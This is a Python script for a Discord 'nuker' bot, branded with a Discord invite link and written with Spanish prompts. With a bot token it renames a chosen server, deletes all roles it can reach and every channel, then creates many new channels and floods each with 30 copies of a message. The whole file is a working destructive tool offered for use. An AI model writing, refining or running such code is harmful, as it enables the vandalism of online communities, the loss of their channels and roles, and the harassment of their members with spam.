import discord
import json
import os
import asyncio
from colorama import Fore, Style, init

init(autoreset=True)

def get_pc_name():
    return os.getlogin()

def set_window_title(title):
    if os.name == 'nt':  
        os.system(f'title {title}')
    else: 
        print(f'\033]0;{title}\007', end='')

def gradient_purple(step, total_steps):
    base_r, base_g, base_b = 186, 85, 211  
    factor = 1 - (step / total_steps)  
    r = int(base_r * factor)
    g = int(base_g * factor)
    b = int(base_b * factor)
    return f'\033[38;2;{r};{g};{b}m'

def print_ascii_art():
    pc_username = get_pc_name()
    width = os.get_terminal_size().columns
    total_lines = 9
    art = f"""
{gradient_purple(0, total_lines)}{' ' * ((width - 48) // 2)} ███▄ ▄███▓    ▄▄▄           ▄████     ██▓    ▄████▄      ▄▄▄          ██▓
{gradient_purple(1, total_lines)}{' ' * ((width - 48) // 2)}▓██▒▀█▀ ██▒   ▒████▄        ██▒ ▀█▒   ▓██▒   ▒██▀ ▀█     ▒████▄       ▓██▒     ├─────────────
{gradient_purple(2, total_lines)}{' ' * ((width - 48) // 2)}▓██    ▓██░   ▒██  ▀█▄     ▒██░▄▄▄░   ▒██▒   ▒▓█    ▄    ▒██  ▀█▄     ▒██░     │Running on:
{gradient_purple(3, total_lines)}{' ' * ((width - 48) // 2)}▒██    ▒██    ░██▄▄▄▄██    ░▓█  ██▓   ░██░   ▒▓▓▄ ▄██▒   ░██▄▄▄▄██    ▒██░     │{pc_username}\'s PC
{gradient_purple(4, total_lines)}{' ' * ((width - 48) // 2)}▒██▒   ░██▒    ▓█   ▓██▒   ░▒▓███▀▒   ░██░   ▒ ▓███▀ ░    ▓█   ▓██▒   ░██████▒ ├─────────────
{gradient_purple(5, total_lines)}{' ' * ((width - 48) // 2)}░ ▒░   ░  ░    ▒▒   ▓▒█░    ░▒   ▒    ░▓     ░ ░▒ ▒  ░    ▒▒   ▓▒█░   ░ ▒░▓  ░ │Discord link:
{gradient_purple(6, total_lines)}{' ' * ((width - 48) // 2)}░  ░      ░     ▒   ▒▒ ░     ░   ░     ▒ ░     ░  ▒        ▒   ▒▒ ░   ░ ░ ▒  ░ │dsc.gg/magicservices
{gradient_purple(7, total_lines)}{' ' * ((width - 48) // 2)}░      ░        ░   ▒      ░ ░   ░     ▒ ░   ░             ░   ▒        ░ ░
{gradient_purple(8, total_lines)}{' ' * ((width - 48) // 2)}       ░            ░  ░         ░     ░     ░ ░               ░  ░       ░  ░
{Style.RESET_ALL}{' ' * ((width - 48) // 2)}
    """
    print(art)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def cargar_token():
    with open('token.json') as f:
        data = json.load(f)
    return data.get('token')

class NukerClient(discord.Client):
    def __init__(self, server_id, nuevo_nombre, canal_nombre, mensaje, cantidad_canales, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.server_id = int(server_id)
        self.nuevo_nombre = nuevo_nombre
        self.canal_nombre = canal_nombre
        self.mensaje = mensaje
        self.cantidad_canales = int(cantidad_canales)

    async def on_ready(self):
        guild = discord.utils.get(self.guilds, id=self.server_id)
        if guild is None:
            print(Fore.RED + Style.BRIGHT + "🚫 No se encontró el servidor con el ID proporcionado." + Style.RESET_ALL)
            await self.close()
            return

        set_window_title(f"dsc.gg/magicservices - Connected as {self.user.name} - On {guild.name}")
        
        try:
            print(Fore.YELLOW + Style.BRIGHT + f"🔄 Cambiando el nombre del servidor a: {self.nuevo_nombre}" + Style.RESET_ALL)
            await guild.edit(name=self.nuevo_nombre)
            print(Fore.GREEN + f"🟢 Nombre del servidor cambiado a: {self.nuevo_nombre}" + Style.RESET_ALL)

            roles = list(guild.roles)
            roles.remove(guild.default_role)

            if roles:
                print(Fore.YELLOW + Style.BRIGHT + "🗑️ Eliminando roles..." + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "🔍 No hay roles para eliminar." + Style.RESET_ALL)

            tasks = [self.delete_role(role) for role in roles if role.position < guild.me.top_role.position]
            await asyncio.gather(*tasks)

            channels = list(guild.channels)

            if channels:
                print(Fore.YELLOW + Style.BRIGHT + "🗑️ Eliminando canales..." + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "🔍 No hay canales para eliminar." + Style.RESET_ALL)

            tasks = [self.delete_channel(channel) for channel in channels]
            await asyncio.gather(*tasks)

            tasks = [self.create_and_spam_channel(guild, i) for i in range(self.cantidad_canales)]
            await asyncio.gather(*tasks)

            print(Fore.GREEN + Style.BRIGHT + "✅ Proceso de nuker completado con éxito." + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + Style.BRIGHT + f"❌ Error durante el proceso de nuker: {e}" + Style.RESET_ALL)

        await self.close()

    async def delete_role(self, role):
        try:
            print(Fore.YELLOW + Style.BRIGHT + f"🗑️ Eliminando rol: {role.name}..." + Style.RESET_ALL)
            await role.delete()
            print(Fore.GREEN + f"✅ Rol eliminado: {role.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"❌ Error al eliminar el rol {role.name}: {e}" + Style.RESET_ALL)

    async def delete_channel(self, channel):
        try:
            print(Fore.YELLOW + Style.BRIGHT + f"🗑️ Eliminando canal: {channel.name}..." + Style.RESET_ALL)
            await channel.delete()
            print(Fore.GREEN + f"✅ Canal eliminado: {channel.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"❌ Error al eliminar el canal {channel.name}: {e}" + Style.RESET_ALL)

    async def create_and_spam_channel(self, guild, index):
        try:
            print(Fore.YELLOW + Style.BRIGHT + f"🆕 Creando y spameando canal: {self.canal_nombre}..." + Style.RESET_ALL)
            new_channel = await guild.create_text_channel(self.canal_nombre)
            await asyncio.gather(*[new_channel.send(self.mensaje) for _ in range(30)])
            print(Fore.GREEN + f"✅ Canal creado y mensajes enviados en: {new_channel.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"❌ Error al crear o enviar mensajes en el canal {self.canal_nombre}: {e}" + Style.RESET_ALL)

def main():
    clear_screen()
    print_ascii_art()
    
    purple_rosy = '\033[38;2;181;111;206m'
    pc_username = get_pc_name()
    
    print(Fore.YELLOW + Style.BRIGHT + "🔒 Proporcione el ID del servidor a procesar. Asegúrese de que el bot tenga los permisos necesarios." + Style.RESET_ALL)
    server_id = input(f'{purple_rosy}{purple_rosy}${Fore.RED} ').strip()
    if not server_id.isdigit():
        print(Fore.RED + "⚠️ El ID del servidor debe ser un número. Saliendo..." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + "🔄 Ingrese el nuevo nombre del servidor: " + Style.RESET_ALL)
    nuevo_nombre = input(f'{purple_rosy}{purple_rosy}${Fore.RED} ').strip()
    if not nuevo_nombre:
        print(Fore.RED + "⚠️ El nombre del servidor no puede estar vacío. Saliendo..." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + "📢 Ingrese el nombre de los nuevos canales: " + Style.RESET_ALL)
    canal_nombre = input(f'{purple_rosy}{purple_rosy}${Fore.RED} ').strip()
    if not canal_nombre:
        print(Fore.RED + "⚠️ El nombre de los canales no puede estar vacío. Saliendo..." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + "🔢 Ingrese la cantidad de canales a crear: " + Style.RESET_ALL)
    cantidad_canales = input(f'{purple_rosy}{purple_rosy}${Fore.RED} ').strip()
    if not cantidad_canales.isdigit():
        print(Fore.RED + "⚠️ Debe ingresar un número válido para la cantidad de canales. Saliendo..." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + "📝 Ingrese el mensaje a enviar en los canales: " + Style.RESET_ALL)
    mensaje = input(f'{purple_rosy}{purple_rosy}${Fore.RED} ').strip()
    if not mensaje:
        print(Fore.RED + "⚠️ El mensaje no puede estar vacío. Saliendo..." + Style.RESET_ALL)
        return

    token = cargar_token()
    if not token:
        print(Fore.RED + "⚠️ No se encontró el token en 'token.json'. Saliendo..." + Style.RESET_ALL)
        return
    
    client = NukerClient(server_id, nuevo_nombre, canal_nombre, mensaje, cantidad_canales, intents=discord.Intents.all())
    
    asyncio.run(client.start(token))

if __name__ == '__main__':
    main()
